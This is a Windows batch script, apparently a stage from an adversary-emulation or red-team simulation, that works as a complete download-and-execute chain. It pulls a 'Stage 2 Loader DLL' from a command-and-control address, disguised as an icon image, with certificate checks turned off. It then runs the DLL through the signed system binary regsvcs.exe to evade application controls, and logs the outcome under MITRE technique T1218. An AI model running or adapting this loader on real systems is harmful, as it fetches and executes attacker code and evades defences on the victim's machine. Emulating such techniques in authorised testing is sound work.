@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET a1b2C3d4=%APPDATA%\11341\c0a7c7a3
SET e5f6G7h8=962a9b46.txt
SET i9j0K1l2=https://10.0.0.49/stage/2/icon.png?11341-7
SET m3n4O5p6=ITZEL-S2B
SET q7r8S9t0=11341
SET u1v2W3x4=7
SET y5z6A7b8=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once for debug lines
SET tsvar=!DATE!/!TIME!

REM Debug log: heartbeat_start
echo [!tsvar!][DEBUG][!m3n4O5p6!][!q7r8S9t0!]: heartbeat_start>> "!y5z6A7b8!" 2>nul

REM Step 1: Heartbeat fetch - download Stage 2 Loader DLL from C2
curl -k -s -o "!a1b2C3d4!\!e5f6G7h8!" "!i9j0K1l2!"

REM Debug log: heartbeat_complete
echo [!tsvar!][DEBUG][!m3n4O5p6!][!q7r8S9t0!]: heartbeat_complete>> "!y5z6A7b8!" 2>nul

REM Step 2: Position working directory
REM Debug log: chdir_start
echo [!tsvar!][DEBUG][!m3n4O5p6!][!q7r8S9t0!]: chdir_start>> "!y5z6A7b8!" 2>nul

cd /d "!a1b2C3d4!" >nul 2>&1

REM Debug log: chdir_result
echo [!tsvar!][DEBUG][!m3n4O5p6!][!q7r8S9t0!]: chdir_result=!errorlevel!>> "!y5z6A7b8!" 2>nul

REM Step 3: Invoke Stage 2 DLL via regsvcs.exe /U
REM Debug log: regsvcs_start
echo [!tsvar!][DEBUG][!m3n4O5p6!][!q7r8S9t0!]: regsvcs_start>> "!y5z6A7b8!" 2>nul

%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!e5f6G7h8!" >NUL 2>&1
SET regsvcs_ret=!errorlevel!

REM Debug log: regsvcs_result
echo [!tsvar!][DEBUG][!m3n4O5p6!][!q7r8S9t0!]: regsvcs_result=!regsvcs_ret!>> "!y5z6A7b8!" 2>nul

REM Step 4: TTP Logging
REM Generate precise timestamp via PowerShell
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttpts=%%t

REM Determine result and error message
if !regsvcs_ret! equ 0 (
    set ttp_result=OK
    set ttp_error=
) else (
    set ttp_result=FAIL
    set ttp_error=regsvcs_exit_!regsvcs_ret!
)

REM Append TTP log line
echo [!ttpts!][TTP][!m3n4O5p6!][!q7r8S9t0!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!y5z6A7b8!" 2>&1

endlocal